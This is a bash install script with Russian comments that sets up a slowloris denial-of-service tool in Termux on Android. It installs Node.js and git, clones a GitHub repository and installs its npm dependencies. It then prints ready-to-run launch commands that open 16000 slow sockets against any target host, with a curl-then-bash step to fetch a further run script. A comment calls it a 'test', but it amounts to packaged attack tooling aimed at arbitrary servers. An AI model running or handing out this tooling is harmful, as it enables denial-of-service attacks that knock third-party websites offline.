#!/bin/bash
# Установка окружения для slowloris-теста в Termux.
# Запуск: curl -o install.sh https://raw.githubusercontent.com/AndriiMSN/slowattack_bash/main/install.sh
#         bash install.sh

set -e

REPO_DIR="$HOME/slowattack_bash"

echo "[+] Обновляю пакеты Termux..."
pkg update -y

echo "[+] Ставлю Node.js и git..."
pkg install -y nodejs git

if [ -d "$REPO_DIR" ]; then
    echo "[+] Обновляю репозиторий..."
    git -C "$REPO_DIR" pull
else
    echo "[+] Клоную репозиторий..."
    git clone https://github.com/AndriiMSN/slowattack_bash.git "$REPO_DIR"
fi

echo "[+] Ставлю npm-зависимости..."
npm install --prefix "$REPO_DIR/vendor-slowloris"

echo "[+] Готово. Запуск:"
echo "    node \$HOME/slowattack_bash/vendor-slowloris/lib/index.js -p 80 -s 16000 -i 20 http://TARGET.sslip.io"
echo "или:"
echo "    curl -o run.sh https://raw.githubusercontent.com/AndriiMSN/slowattack_bash/main/run.sh"
echo "    bash run.sh <HOST> [PORT] [SOCKETS] [DURATION_MS] [INSTANCES]"
